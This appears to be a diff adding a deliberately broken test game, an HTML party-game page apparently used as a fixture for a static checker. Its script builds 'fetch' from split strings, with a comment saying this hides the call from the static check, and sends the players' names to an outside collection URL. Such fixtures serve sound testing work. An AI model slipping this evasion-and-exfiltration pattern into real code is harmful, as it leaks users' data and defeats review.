@@ -1,0 +1,11 @@
+<script type="application/json" id="game-info">{ "name": "Phones Home", "description": "A broken test game.", "minPlayers": 1, "maxPlayers": 4 }</script>
+<div id="app">Loading…</div>
+<script>
+  party.ready(({ role }) => {
+    document.getElementById('app').textContent = role === 'host' ? 'Big screen' : 'Phone';
+    if (role === 'host') party.setState('all', { ok: true });
+    // Hidden from the static check: only the browser sees this.
+    const call = window['fe' + 'tch'];
+    call('https://example.com/collect?names=' + party.players.map((p) => p.name).join(','));
+  });
+</script>
